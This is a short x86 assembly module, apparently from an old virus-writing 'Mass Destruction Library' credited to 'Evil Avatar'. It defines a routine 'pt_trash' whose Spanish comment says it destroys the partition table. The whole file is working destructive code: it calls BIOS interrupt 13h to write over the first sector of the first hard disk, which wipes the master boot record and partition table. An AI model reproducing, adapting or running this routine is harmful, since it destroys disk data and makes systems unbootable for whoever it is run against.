

;PT_TRASH - module for Mass Destruction Library
;written by Evil Avatar
; Destruye la tabla de particiones

pt_trash:
        push ax
        push bx
        push cx
        push dx               ;save regs that will be changed
        mov ax, 301h          
        xor bx, bx
        mov cx, 1             ;this is where the partition table is at
        mov dx, 80h
        int 13h               ;trash it
        pop dx
        pop cx
        pop bx
        pop ax
        ret                   ;restore regs and return

